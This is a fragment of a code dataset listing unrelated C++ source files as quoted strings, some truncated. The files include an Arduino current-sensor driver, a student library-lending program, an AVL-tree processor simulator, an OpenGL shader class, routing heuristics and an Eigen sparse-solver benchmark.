DirEntry::ParseDirFile(\"valid2_duplicate_filenames.dir\");\n\n  const std::vector<DirEntry> expected = {\n    {\n      .sectorStart = 3,\n      .sectorCount = 5,\n      .fileName = \"foo.bar\"\n    },\n    {\n      .sectorStart = 5,\n      .sectorCount = 256,\n      .fileName = \"foo.bar\"\n    },\n  };\n\n  EXPECT_EQ(expected, result);\n}\n",
    "// reference: circuito.io and ACS712 library\n#include \"ACS712.h\"\n#include \"Arduino.h\"\n\nACS712::ACS712(const int pin) : AnalogReader(pin)\n{\n}\n/**\n * Manually calibrate current sensor.\n * calFactor - current calibration factor.\n */\nvoid ACS712::calibrate(int calFactor)\n{\n  \n  long rawVal =0;\n  for(int i=0 ; i<1000 ; i++)\n    rawVal += read();\n  int cal = rawVal / 1000;\n  Serial.println(cal);\n  if(abs(cal - calFactor) < 1)\n  {\n    Serial.print(F(\"Your calibration factor is good!\"));\n  }\n  else\n  {\n    Serial.print(F(\"Your calibration factor is: \"));\n    Serial.println(cal);\n    Serial.print(F(\"Update the calFactor variable in top of Firmware.ino and run again.\"));\n    while(true);\n  }\n  m_calFactor = cal;\n}\n\n/**\n * Get averaged current measurment.\n * cals - number of readings to average.\n * Returns - sensed current in Ampere.\n */\nfloat ACS712::getCurrent(int cals)\n{\n  float tot_adc = 0;\n  for(int i = 0; i < cals; i++){\n    tot_adc += read();\n  }  \n  float adc = tot_adc / float(cals);  \n  float voltage = adc * vcc / max;\n  float current = (voltage - (vcc / 2)) / sensitivity;\n  return current;\n}\n\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <map>\r\n#include <algorithm>\r\n\r\nclass Libro {\r\npublic:\r\n    std::string titulo;\r\n    std::string autor;\r\n    std::string materia;\r\n\r\n    Libro(std::string t, std::string a, std::string m) : titulo(t), autor(a), materia(m) {}\r\n\r\n    bool operator==(const Libro& other) const {\r\n        return titulo == other.titulo && autor == other.autor && materia == other.materia;\r\n    }\r\n    bool operator<(const Libro& other) const {\r\n        return titulo < other.titulo && autor < other.autor && materia < other.materia;\r\n    }\r\n};\r\n\r\nclass Usuario {\r\npublic:\r\n    std::string nombre;\r\n    std::string identidad;\r\n    Usuario() : nombre(\"\"),identidad(\"\"){}\r\n    Usuario(std::string n, std::string id) : nombre(n), identidad(id) {}\r\n};\r\n\r\nclass Biblioteca {\r\npublic:\r\n    std::vector<Libro> librosDisponibles;\r\n    std::map<Libro, Usuario> librosPrestados;\r\n\r\npublic:\r\n    void agregarLibro(Libro libro) {\r\n        librosDisponibles.push_back(libro);\r\n    }\r\n\r\n    void prestarLibro(Libro libro, Usuario usuario) {\r\n        librosPrestados[libro] = usuario;\r\n\r\n        // Eliminar el libro prestado de la lista de disponibles\r\n        librosDisponibles.erase(std::remove(librosDisponibles.begin(), librosDisponibles.end(), libro), librosDisponibles.end());\r\n\r\n        std::cout << \"El libro '\" << libro.titulo << \"' ha sido prestado a \" << usuario.nombre << std::endl;\r\n    }\r\n\r\n    void devolverLibro(Libro libro) {\r\n        librosDisponibles.push_back(libro);\r\n        librosPrestados.erase(libro);\r\n\r\n        std::cout << \"El libro '\" << libro.titulo << \"' ha sido devuelto\" << std::endl;\r\n    }\r\n\r\n    bool mostrarLibrosDisponibles() {\r\n        for (const Libro& libro : librosDisponibles) {\r\n            std::cout << \"Titulo: \" << libro.titulo << \", Autor: \" << libro.autor << \", Materia: \" << libro.materia << std::endl;\r\n        }\r\n    }\r\n\r\n    void guardarDatos(std::string archivo) {\r\n        std::ofstream file(archivo);\r\n\r\n        if (file.is_open()) {\r\n            for (const Libro& libro : librosDisponibles) {\r\n                file << \"Libro: \" << libro.titulo << \", Autor: \" << libro.autor << \", Materia: \" << libro.materia << \"\\n\";\r\n            }\r\n\r\n            for (const auto& prestamo : librosPrestados) {\r\n                file << \"Libro prestado: \" << prestamo.first.titulo << \" a \" << prestamo.second.nombre << \"\\n\";\r\n            }\r\n\r\n            file.close();\r\n            std::cout << \"Datos guardados exitosamente en el archivo '\" << archivo << \"'\" << std::endl;\r\n        } else {\r\n            std::cerr << \"Error al abrir el archivo para guardar los datos\" << std::endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    Biblioteca biblioteca;\r\n\r\n    // Cargar datos de la biblioteca desde un archivo (si existe)\r\n    std::ifstream file(\"datos_biblioteca.txt\");\r\n    if (file.is_open()) {\r\n        std::string linea;\r\n        while (getline(file, linea)) {\r\n            if (linea.find(\"Libro: \") != std::string::npos) {\r\n                std::string titulo, autor, materia;\r\n                size_t pos = linea.find(\"Autor: \");\r\n                titulo = linea.substr(7, pos - 8);\r\n                pos = linea.find(\"Materia: \");\r\n                autor = linea.substr(linea.find(\"Autor: \") + 7, pos - linea.find(\"Autor: \") - 8);\r\n                materia = linea.substr(linea.find(\"Materia: \") + 9);\r\n\r\n                Libro libro(titulo, autor, materia);\r\n                biblioteca.agregarLibro(libro);\r\n            } else if (linea.find(\"Libro prestado: \") != std::string::npos) {\r\n                std::string titulo, nombreUsuario;\r\n                size_t pos = linea.find(\" a \");\r\n                titulo = linea.substr(16, pos - 16);\r\n                nombreUsuario = linea.substr(pos + 3);\r\n\r\n                Libro libroPrestado(titulo, \"\", \"\");\r\n                Usuario usuario(nombreUsuario, \"\");\r\n                biblioteca.prestarLibro(libroPrestado, usuario);\r\n            }\r\n        }\r\n        file.close();\r\n        std::cout << \"Datos cargados exitosamente desde el archivo 'datos_biblioteca.txt'\" << std::endl;\r\n    } else {\r\n        std::cout << \"No se encontro un archivo con datos de la biblioteca. Se creara uno nuevo al guardar los datos.\" << std::endl;\r\n    }\r\n\r\n    while (true) {\r\n        int opcion;\r\n        std::cout << \" 1.Agregar libro \\n 2.Prestar libro \\n 3.Devolver libro \\n 4.Mostrar libros disponibles \\n 5.Guardar datos \\n 6.Salir \\n\";\r\n        std::cout << \"Ingrese el numero de la opcion que desea realizar: \";\r\n        std::cin >> opcion;\r\n\r\n        if (opcion == 1) {\r\n            std::string titulo, autor, materia;\r\n            std::cout << \"Ingrese el titulo del libro: \";\r\n            std::cin.ignore();\r\n            getline(std::cin, titulo);\r\n            std::cout << \"Ingrese el autor del libro: \";\r\n            getline(std::cin, autor);\r\n            std::cout << \"Ingrese la materia del libro: \";\r\n            getline(std::cin, materia);\r\n\r\n            Libro nuevoLibro(titulo, autor,",
    "#include \"proj.hpp\"\nusing namespace std;\n\n// ------------Global variables----------------------------------------------------------------------\n// Feel free to add or remove. \n// You could make these local variables for cleaner code, but you need to change function definitions \nint int_ALU = 0; // integer alu vancany. 0 is not being used else it is 1 if it is.\nint ftp_ALU = 0; // floating point alu vancancy. 0 is empty, 1 is using.\nint branch_ex = 0; // branch execution if being used is 1 else is 0\nint storing_port = 0; // write port 0 if not being used 1 if being used.\nint loading_port = 0; // read port 0 if not being used 1 if being used.\n\n// NOTE: all AddressNode functions for the tree is referenced from Geeks for Geeks.\n// https://www.geeksforgeeks.org/insertion-in-an-avl-tree/\n\n// inserting instruction to a queue\nvoid Insert_Queue(struct InstructionQueue *InstructionQueue, struct Instruction *Instruction) {\n\n    if (InstructionQueue->head == NULL) {\n\n        InstructionQueue->head = Instruction;\n        InstructionQueue->tail = Instruction;\n\n    } else {\n       \n        InstructionQueue->tail->next = Instruction;\n        Instruction->prev = InstructionQueue->tail;\n        InstructionQueue->tail = Instruction;\n    }\n\n    InstructionQueue->count++;\n}\n\n// Helper function to get the height of a node\nint height(struct AddressNode *node) {\n\n    if (node == NULL) {\n\n        return 0;\n    }\n\n    return node->height;\n}\n\n// make a new Address node\nstruct AddressNode *newAddressNode(unsigned long address) {\n\n    struct AddressNode* node = new struct AddressNode;\n    node->address = address;\n    node->left = NULL;\n    node->right = NULL;\n    node->height = 1;\n    return node;\n}\n\n// Helper function to right rotate subtree rooted with y\nstruct AddressNode *rightRotate(struct AddressNode *y) {\n\n    struct AddressNode *x = y->left;\n    struct AddressNode *T2 = x->right;\n\n    // Perform rotation\n    x->right = y;\n    y->left = T2;\n\n    // Update heights\n    y->height = max(height(y->left), height(y->right)) + 1;\n    x->height = max(height(x->left), height(x->right)) + 1;\n\n    // Return new root\n    return x;\n}\n\n// Helper function to left rotate subtree rooted with x\nstruct AddressNode *leftRotate(struct AddressNode *x) {\n    struct AddressNode *y = x->right;\n    struct AddressNode *T2 = y->left;\n\n    // Perform rotation\n    y->left = x;\n    x->right = T2;\n\n    // Update heights\n    x->height = max(height(x->left), height(x->right)) + 1;\n    y->height = max(height(y->left), height(y->right)) + 1;\n\n    // Return new root\n    return y;\n}\n\n// Get Balance factor of node\nint getBalance(struct AddressNode *node) {\n\n    if (node == NULL) {\n        return 0;\n    }\n\n    return height(node->left) - height(node->right);\n}\n\n// Recursive function to insert a node with given address in AVL tree\nstruct AddressNode* insertAddress(struct AddressNode *node, unsigned long address) {\n\n    // Perform normal BST insertion\n    if (node == NULL) {\n\n        return newAddressNode(address);\n    }\n\n    if (address < node->address) {\n\n        node->left = insertAddress(node->left, address);\n\n    } else if (address > node->address) {\n\n        node->right = insertAddress(node->right, address);\n\n    } else { // Duplicate addresses are not allowed\n\n        return node;\n    }\n\n    // Update height of this ancestor node\n    node->height = 1 + max(height(node->left), height(node->right));\n\n    // check if it became unbalanced\n    int balance = getBalance(node);\n\n    // If this node becomes unbalanced, four cases\n\n    // Left Left Case\n    if (balance > 1 && address < node->left->address) {\n\n        return rightRotate(node);\n    }\n\n    // Right Right Case\n    if (balance < -1 && address > node->right->address) {\n\n        return leftRotate(node);\n    }\n\n    // Left Right Case\n    if ((balance > 1) && (address > node->left->address)) {\n\n        node->left = leftRotate(node->left);\n        return rightRotate(node);\n    }\n\n    // Right Left Case\n    if ((balance < -1) && (address < node->right->address)) {\n\n        node->right = rightRotate(node->right);\n        return leftRotate(node);\n    }\n\n    return node;\n}\n\n// Insert address into AVL tree\nvoid Insert_Address(struct AddressTree *address_tree, unsigned long instruction_address){\n\n    address_tree->root = insertAddress(address_tree->root, instruction_address);\n    address_tree->count++;\n}\n\n// return the node with the min address value found in that sub tree\nstruct AddressNode *minValueNode(struct AddressNode *node) {\n\n    struct AddressNode *current = node;\n\n    while (current->left != NULL) {\n\n        current = current->left;\n    }\n\n    return current;\n}\n\n// Recursive function to delete a node with given address from AVL tree and adjust the address queue\nstruct AddressNode* deleteAddress(struct AddressNode *root, unsigned long address) {\n   \n    if (root == NULL) {\n\n        return root;\n    }\n\n    // Search for the node to be deleted\n    if (address < root->address) {\n\n        root->left = deleteAddress(ro",
    "#include \"Shader.h\"\n\nShader::Shader(const char* vertexPath, const char* fragmentPath)\n{\n\tInit(vertexPath, fragmentPath);\n}\n\nShader& Shader::Use()\n{\n\tglUseProgram(this->ID);\n\treturn *this;\n}\n\nunsigned int Shader::GetID() const\n{\n\treturn this->ID;\n}\n\nvoid Shader::SetInt(const std::string& name, int value)\n{\n\tglUniform1i(glGetUniformLocation(this->ID, name.c_str()), value);\n}\n\nvoid Shader::SetFloat(const std::string& name, const float& value)\n{\n\tglUniform1f(glGetUniformLocation(this->ID, name.c_str()), value);\n}\n\nvoid Shader::SetVec3(const std::string& name, const glm::vec3& value)\n{\n\tglUniform3fv(glGetUniformLocation(this->ID, name.c_str()), 1, &value[0]);\n}\n\nvoid Shader::SetVec3(const std::string& name, float x, float y, float z)\n{\n\tglUniform3f(glGetUniformLocation(this->ID, name.c_str()), x, y, z);\n}\n\nvoid Shader::SetMat4(const std::string& name, const glm::mat4& mat)\n{\n\tglUniformMatrix4fv(glGetUniformLocation(this->ID, name.c_str()), 1, GL_FALSE, &mat[0][0]);\n}\n\nvoid Shader::Init(const char* vertexSource, const char* fragmentSource)\n{\n\tunsigned int sVertex, sFragment, gShader;\n\t// Vertex Shader\n\tsVertex = glCreateShader(GL_VERTEX_SHADER);\n\tglShaderSource(sVertex, 1, &vertexSource, NULL);\n\tglCompileShader(sVertex);\n\tCheckCompileErrors(sVertex, \"VERTEX\");\n\t// Fragment Shader\n\tsFragment = glCreateShader(GL_FRAGMENT_SHADER);\n\tglShaderSource(sFragment, 1, &fragmentSource, NULL);\n\tglCompileShader(sFragment);\n\tCheckCompileErrors(sFragment, \"FRAGMENT\");\n\t// Shader Program\n\tthis->ID = glCreateProgram();\n\tglAttachShader(this->ID, sVertex);\n\tglAttachShader(this->ID, sFragment);\n\tglLinkProgram(this->ID);\n\tCheckCompileErrors(this->ID, \"PROGRAM\");\n\t// Delete the shaders as they're linked into our program now and no longer necessery\n\tglDeleteShader(sVertex);\n\tglDeleteShader(sFragment);\n}\n\nvoid Shader::CheckCompileErrors(unsigned int shader, std::string type)\n{\n\tGLint success;\n\tGLchar infoLog[1024];\n\tif (type != \"PROGRAM\") {\n\t\tglGetShaderiv(shader, GL_COMPILE_STATUS, &success);\n\t\tif (!success) {\n\t\t\tglGetShaderInfoLog(shader, 1024, NULL, infoLog);\n\t\t\tstd::cout << \"ERROR::SHADER_COMPILATION_ERROR of type: \" << type << \"\\n\" << infoLog << \"\\n -- --------------------------------------------------- -- \" << std::endl;\n\t\t}\n\t}\n\telse {\n\t\tglGetProgramiv(shader, GL_LINK_STATUS, &success);\n\t\tif (!success) {\n\t\t\tglGetProgramInfoLog(shader, 1024, NULL, infoLog);\n\t\t\tstd::cout << \"ERROR::PROGRAM_LINKING_ERROR of type: \" << type << \"\\n\" << infoLog << \"\\n -- --------------------------------------------------- -- \" << std::endl;\n\t\t}\n\t}\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n#define fore(i,a,b) for(int i=(a);i<(b);i++)\n#define forr(i, a, b) for(int i=(b);i>(a);i--)\n#define forn(e,c) for(const auto &e : (c))\n#define db(x) cout<<#x<< \" = \"<<(x)<<endl\n#define sz(x) ((int)x.size())\n#define all(x) (x).begin(),(x).end()\n#define pb push_back\n#define pp pop_back\n#define fst first\n#define snd second\n#define str string\n#define pri(x) cout << (x) << \"\\n\"\n#define mset(a,v) memset((a),(v),sizeof(a))\n#define FIN ios::sync_with_stdio(0);cin.tie(0);cout.tie(0); \nusing ll = long long;\nusing pii = pair<int,int>;\nusing pll = pair<ll,ll>;\nusing vii = vector<int>;\nusing vll = vector<ll>;\nusing vpi = vector<pii>;\ntemplate<class T>ostream&operator<<(ostream&o,vector<T>const&v){o<<\"[ \";for(auto const&x:v)o<<x<<\" \";return o<<\"]\";}\n\nvoid solve(){\n\tint n; cin>>n; \n\tvii a(n); fore(i, 0, n) cin>>a[i];\n\tvii b(n); fore(i, 0, n) cin>>b[i]; \n\tstring res = \"Yes\";\n\tfore(i, 0, n-1){\n\t\tif(a[i] > a[n-1]) res = \"No\";\n\t\tif(b[i] > b[n-1]) res = \"No\";\n\t}\n\tif(res == \"No\"){\n\t\tfore(i, 0, n){\n\t\t\tif(b[i] <= a[n-1]) res = \"Yes\";\n\t\t\tif(a[i] <= b[n-1]) res = \"Yes\";\n\t\t}\n\t}\n    cout << res << \"\\n\";\n}\n \nint main(){\n    FIN; \n    //int t = 1;\n    int t; cin>>t; \n    while(t--){\n\t\t\tsolve();\n\t}\n    return 0;\n}\n",
    "#include \"Perturbations.h\"\n\nPerturbations::Perturbations() {\n    edge_penalties_ = vector<vector<int>>(Instance::instance()->num_nodes(), vector<int>(Instance::instance()->num_nodes(), 0));\n    load_penalties_ = vector<int>(Instance::instance()->num_requests() + 1, 1);\n    lambda_ = 0.5;\n}\n\nvoid Perturbations::IR_Multiple_exchanges(Solution & solution) {\n    int num_vehicles = Instance::instance()->num_vehicles();\n    int num_requests = Instance::instance()->num_requests();\n    int num_route_nodes, num_moves, rnd_aux;\n    int pos_node_i, pos_node_j;\n\n    Solution solution_aux(num_requests, num_vehicles);\n    solution_aux.routes_pickup_ = solution.routes_pickup_;\n    solution_aux.routes_delivery_ = solution.routes_delivery_;\n\n    for (int pd = 0; pd < 2; ++pd) {\n        Routes & routes = (pd == 0 ? solution_aux.routes_pickup_ : solution_aux.routes_delivery_);\n        Routes & orig_routes = (pd == 0 ? solution.routes_pickup_ : solution.routes_delivery_);\n\n        for (int k = 0; k < num_vehicles; ++k) {\n            num_route_nodes = routes[k].num_nodes_;\n\n            if (num_route_nodes > 3) {\n                num_moves = uni_rand(1, num_route_nodes - 1);\n                for (int c = 0; c < num_moves; ++c) {\n                    pos_node_i = uni_rand(1, num_route_nodes);\n\n                    do {\n                        pos_node_j = uni_rand(1, num_route_nodes);\n                    } while(pos_node_j == pos_node_i\n                            || routes[k].visited_nodes_[pos_node_j] == orig_routes[k].visited_nodes_[pos_node_i]\n                            || routes[k].visited_nodes_[pos_node_i] == orig_routes[k].visited_nodes_[pos_node_j]);\n\n                    swap(routes[k].visited_nodes_[pos_node_i], routes[k].visited_nodes_[pos_node_j]);\n                }\n            } else if (num_route_nodes == 3) {\n                rnd_aux = uni_rand(1,2);\n\n                if (rnd_aux == 1) {\n                    swap(routes[k].visited_nodes_[1], routes[k].visited_nodes_[2]);\n                } else {\n                    swap(routes[k].visited_nodes_[2], routes[k].visited_nodes_[3]);\n                }\n            }\n\n            if (num_route_nodes >= 3) {\n                routes[k].cost_ = 0.0;\n                for (int i = 0; i <= routes[k].num_nodes_; ++i) {\n                    routes[k].cost_ += Instance::instance()->EdgeCost(routes[k].visited_nodes_[i], routes[k].visited_nodes_[i + 1]);\n                }\n            }\n        }\n    }\n\n    ConstructiveHeuristics ch;\n    ch.DefineScheduling2(solution_aux);\n\n    for (int k = 0; k < Instance::instance()->num_vehicles(); ++k) {\n        solution_aux.cost_ += solution_aux.routes_delivery_[k].cost_ + solution_aux.schedule_manager_.schedules_[k].completion_time_;\n    }\n\n    solution = solution_aux;\n}\n\nvoid Perturbations::UN_Multiple_exchanges(Solution & solution) {\n    int num_vehicles = Instance::instance()->num_vehicles();\n    int num_requests = Instance::instance()->num_requests();\n    int num_unl_reqs, num_moves;\n    int pos_node_i, pos_node_j;\n\n    Solution solution_aux = solution;\n\n    Schedules & schedules = solution_aux.schedule_manager_.schedules_;\n    Schedules & orig_schedules = solution.schedule_manager_.schedules_;\n\n    for (int k = 0; k < num_vehicles; ++k) {\n        if (schedules[k].unloaded_reqs_.size() > 1) {\n            num_unl_reqs = static_cast<int>(schedules[k].unloaded_reqs_.size());\n            num_moves = uni_rand(1, num_unl_reqs - 1);\n\n            for (int c = 0; c < num_moves; ++c) {\n                pos_node_i = uni_rand(0, num_unl_reqs - 1);\n\n                do {\n                    pos_node_j = uni_rand(0, num_unl_reqs - 1);\n                } while(pos_node_j == pos_node_i\n                        || schedules[k].unloaded_reqs_[pos_node_j].ind_ == orig_schedules[k].unloaded_reqs_[pos_node_i].ind_\n                        || schedules[k].unloaded_reqs_[pos_node_i].ind_ == orig_schedules[k].unloaded_reqs_[pos_node_j].ind_);\n\n                swap(schedules[k].unloaded_reqs_[pos_node_i], schedules[k].unloaded_reqs_[pos_node_j]);\n            }\n        }\n    }\n\n    vector<double> req_start_unload(num_requests + 1, -1.0);\n    double aux_start_unload;\n    for (int k = 0; k < num_vehicles; ++k) {\n        aux_start_unload = schedules[k].start_time_ + Instance::instance()->unload_preparation_time();\n        for (uint i = 0; i < schedules[k].unloaded_reqs_.size(); ++i) {\n            schedules[k].unloaded_reqs_[i].start_time_ = aux_start_unload;\n            req_start_unload[schedules[k].unloaded_reqs_[i].ind_] = aux_start_unload;\n            aux_start_unload += Instance::instance()->unloading_time(schedules[k].unloaded_reqs_[i].ind_);\n        }\n    }\n\n    for (int k = 0; k < num_vehicles; ++k) {\n        for (uint i = 0; i < schedules[k].reloaded_reqs_.size(); ++i) {\n            schedules[k].reloaded_reqs_[i].availability_time_ = req_start_unload[schedules[k].reloaded_reqs_[i].ind_]\n                                                                + Instance::instance()->un",
    "/**\n* Copyright 2018 Woods Hole Oceanographic Institution\n*\n* Redistribution and use in source and binary forms, with or without\n* modification, are permitted provided that the following conditions are met:\n*\n* 1. Redistributions of source code must retain the above copyright notice,\n*    this list of conditions and the following disclaimer.\n*\n* 2. Redistributions in binary form must reproduce the above copyright notice,\n*    this list of conditions and the following disclaimer in the documentation\n*    and/or other materials provided with the distribution.\n*\n* 3. Neither the name of the copyright holder nor the names of its contributors\n*    may be used to endorse or promote products derived from this software\n*    without specific prior written permission.\n*\n* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n* ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\n* LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n* CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n* CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n* ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n* POSSIBILITY OF SUCH DAMAGE.\n*/\n",
    "\n//g++ -O3 -g0 -DNDEBUG  sparse_product.cpp -I.. -I/home/gael/Coding/LinearAlgebra/mtl4/ -DDENSITY=0.005 -DSIZE=10000 && ./a.out\n//g++ -O3 -g0 -DNDEBUG  sparse_product.cpp -I.. -I/home/gael/Coding/LinearAlgebra/mtl4/ -DDENSITY=0.05 -DSIZE=2000 && ./a.out\n// -DNOGMM -DNOMTL\n// -I /home/gael/Coding/LinearAlgebra/CSparse/Include/ /home/gael/Coding/LinearAlgebra/CSparse/Lib/libcsparse.a\n\n#ifndef SIZE\n#define SIZE 10000\n#endif\n\n#ifndef DENSITY\n#define DENSITY 0.01\n#endif\n\n#ifndef REPEAT\n#define REPEAT 1\n#endif\n\n#include \"BenchSparseUtil.h\"\n\n#ifndef MINDENSITY\n#define MINDENSITY 0.0004\n#endif\n\n#ifndef NBTRIES\n#define NBTRIES 10\n#endif\n\n#define BENCH(X) \\\n  timer.reset(); \\\n  for (int _j=0; _j<NBTRIES; ++_j) { \\\n    timer.start(); \\\n    for (int _k=0; _k<REPEAT; ++_k) { \\\n        X  \\\n  } timer.stop(); }\n\ntypedef SparseMatrix<Scalar,UpperTriangular> EigenSparseTriMatrix;\ntypedef SparseMatrix<Scalar,RowMajorBit|UpperTriangular> EigenSparseTriMatrixRow;\n\nvoid fillMatrix(float density, int rows, int cols,  EigenSparseTriMatrix& dst)\n{\n  dst.startFill(rows*cols*density);\n  for(int j = 0; j < cols; j++)\n  {\n    for(int i = 0; i < j; i++)\n    {\n      Scalar v = (internal::random<float>(0,1) < density) ? internal::random<Scalar>() : 0;\n      if (v!=0)\n        dst.fill(i,j) = v;\n    }\n    dst.fill(j,j) = internal::random<Scalar>();\n  }\n  dst.endFill();\n}\n\nint main(int argc, char *argv[])\n{\n  int rows = SIZE;\n  int cols = SIZE;\n  float density = DENSITY;\n  BenchTimer timer;\n  #if 1\n  EigenSparseTriMatrix sm1(rows,cols);\n  typedef Matrix<Scalar,Dynamic,1> DenseVector;\n  DenseVector b = DenseVector::Random(cols);\n  DenseVector x = DenseVector::Random(cols);\n\n  bool densedone = false;\n\n  for (float density = DENSITY; density>=MINDENSITY; density*=0.5)\n  {\n    EigenSparseTriMatrix sm1(rows, cols);\n    fillMatrix(density, rows, cols, sm1);\n\n    // dense matrices\n    #ifdef DENSEMATRIX\n    if (!densedone)\n    {\n      densedone = true;\n      std::cout << \"Eigen Dense\\t\" << density*100 << \"%\\n\";\n      DenseMatrix m1(rows,cols);\n      Matrix<Scalar,Dynamic,Dynamic,Dynamic,Dynamic,RowMajorBit> m2(rows,cols);\n      eiToDense(sm1, m1);\n      m2 = m1;\n\n      BENCH(x = m1.marked<UpperTriangular>().solveTriangular(b);)\n      std::cout << \"   colmajor^-1 * b:\\t\" << timer.value() << endl;\n//       std::cerr << x.transpose() << \"\\n\";\n\n      BENCH(x = m2.marked<UpperTriangular>().solveTriangular(b);)\n      std::cout << \"   rowmajor^-1 * b:\\t\" << timer.value() << endl;\n//       std::cerr << x.transpose() << \"\\n\";\n    }\n    #endif\n\n    // eigen sparse matrices\n    {\n      std::cout << \"Eigen sparse\\t\" << density*100 << \"%\\n\";\n      EigenSparseTriMatrixRow sm2 = sm1;\n\n      BENCH(x = sm1.solveTriangular(b);)\n      std::cout << \"   colmajor^-1 * b:\\t\" << timer.value() << endl;\n//       std::cerr << x.transpose() << \"\\n\";\n\n      BENCH(x = sm2.solveTriangular(b);)\n      std::cout << \"   rowmajor^-1 * b:\\t\" << timer.value() << endl;\n//       std::cerr << x.transpose() << \"\\n\";\n\n//       x = b;\n//       BENCH(sm1.inverseProductInPlace(x);)\n//       std::cout << \"   colmajor^-1 * b:\\t\" << timer.value() << \" (inplace)\" << endl;\n//       std::cerr << x.transpose() << \"\\n\";\n//\n//       x = b;\n//       BENCH(sm2.inverseProductInPlace(x);)\n//       std::cout << \"   rowmajor^-1 * b:\\t\" << timer.value() << \" (inplace)\" << endl;\n//       std::cerr << x.transpose() << \"\\n\";\n    }\n\n\n\n    // CSparse\n    #ifdef CSPARSE\n    {\n      std::cout << \"CSparse \\t\" << density*100 << \"%\\n\";\n      cs *m1;\n      eiToCSparse(sm1, m1);\n\n      BENCH(x = b; if (!cs_lsolve (m1, x.data())){std::cerr << \"cs_lsolve failed\\n\"; break;}; )\n      std::cout << \"   colmajor^-1 * b:\\t\" << timer.value() << endl;\n    }\n    #endif\n\n    // GMM++\n    #ifndef NOGMM\n    {\n      std::cout << \"GMM++ sparse\\t\" << density*100 << \"%\\n\";\n      GmmSparse m1(rows,cols);\n      gmm::csr_matrix<Scalar> m2;\n      eiToGmm(sm1, m1);\n      gmm::copy(m1,m2);\n      std::vector<Scalar> gmmX(cols), gmmB(cols);\n      Map<Matrix<Scalar,Dynamic,1> >(&gmmX[0], cols) = x;\n      Map<Matrix<Scalar,Dynamic,1> >(&gmmB[0], cols) = b;\n\n      gmmX = gmmB;\n      BENCH(gmm::upper_tri_solve(m1, gmmX, false);)\n      std::cout << \"   colmajor^-1 * b:\\t\" << timer.value() << endl;\n//       std::cerr << Map<Matrix<Scalar,Dynamic,1> >(&gmmX[0], cols).transpose() << \"\\n\";\n\n      gmmX = gmmB;\n      BENCH(gmm::upper_tri_solve(m2, gmmX, false);)\n      timer.stop();\n      std::cout << \"   rowmajor^-1 * b:\\t\" << timer.value() << endl;\n//       std::cerr << Map<Matrix<Scalar,Dynamic,1> >(&gmmX[0], cols).transpose() << \"\\n\";\n    }\n    #endif\n\n    // MTL4\n    #ifndef NOMTL\n    {\n      std::cout << \"MTL4\\t\" << density*100 << \"%\\n\";\n      MtlSparse m1(rows,cols);\n      MtlSparseRowMajor m2(rows,cols);\n      eiToMtl(sm1, m1);\n      m2 = m1;\n      mtl::dense_vector<Scalar> x(rows, 1.0);\n      mtl::dense_vector<Scalar> b(rows, 1.0);\n\n      BENCH(x = mtl::upper_trisolve(m1,b);)\n      std::cout << \"   colmajor^-1 * b:\\t\" << timer.value() << endl;\n// ",
